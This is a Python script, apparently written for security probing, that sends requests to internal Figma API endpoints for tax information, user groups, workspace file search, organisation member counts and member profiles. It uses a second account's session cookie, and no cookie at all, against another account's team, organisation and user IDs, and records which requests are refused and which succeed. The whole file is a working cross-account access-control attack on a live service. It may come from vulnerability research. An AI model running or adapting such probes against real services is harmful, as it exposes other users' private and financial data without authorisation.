# -*- coding: utf-8 -*-
"""新 sinatra_resolver 直连权限门矩阵: B cookie vs 匿名
目标: tax_info / user_groups_by_name / search_workspace_files / org_member_count
参数: A 的 team/org, 观察 403/200 分界线
"""
import io, json, sys, urllib.error, urllib.request, urllib.parse
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_TEAM = "1666382706663462213"
DEMO_ORG = "1484997479016537761"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')

def call(label, path, query=None, cookie=BC):
    url = BASE + path
    if query:
        url += '?' + urllib.parse.urlencode(query)
    headers = {"User-Agent": UA, "Content-Type": "application/json",
               "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
               "X-Figma-User-ID": B_UID}
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(url, headers=headers)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        print(f"[{label}] → {r.status} {r.read().decode(errors='replace')[:200]}")
    except urllib.error.HTTPError as e:
        print(f"[{label}] → {e.code} {e.read().decode(errors='replace')[:200]}")
    except Exception as e:
        print(f"[{label}] → ❌ {type(e).__name__}: {str(e)[:100]}")

print("======== 1. tax_info (税务信息) ========")
call("tax A_ORG+自己", "/api/internal/livegraph/sinatra_resolver/tax_info",
     {"org_id": DEMO_ORG, "userId": B_UID})
call("tax A_TEAM+自己", "/api/internal/livegraph/sinatra_resolver/tax_info",
     {"team_id": A_TEAM, "userId": B_UID})
call("tax 匿名", "/api/internal/livegraph/sinatra_resolver/tax_info",
     {"org_id": DEMO_ORG, "userId": B_UID}, cookie=None)

print("\n======== 2. user_groups_by_name (用户组搜索) ========")
call("ugbn 空名", "/api/internal/livegraph/sinatra_resolver/user_groups_by_name", {"name": ""})
call("ugbn test", "/api/internal/livegraph/sinatra_resolver/user_groups_by_name", {"name": "test"})

print("\n======== 3. search_workspace_files (工作区文件搜索) ========")
call("swf 空", "/api/internal/livegraph/sinatra_resolver/search_workspace_files", {"workspaceId": "", "query": ""})

print("\n======== 4. org_member_count (org成员数) ========")
call("omc DEMO_ORG", "/api/internal/livegraph/sinatra_resolver/org_member_count", {"org_id": DEMO_ORG})
call("omc A_TEAM", "/api/internal/livegraph/sinatra_resolver/org_member_count", {"org_id": A_TEAM})

print("\n======== 5. member_flyout_info (成员信息) ========")
call("mfi B_UID", "/api/internal/livegraph/sinatra_resolver/member_flyout_info", {"user_id": B_UID})
call("mfi A_UID", "/api/internal/livegraph/sinatra_resolver/member_flyout_info", {"user_id": A_UID})
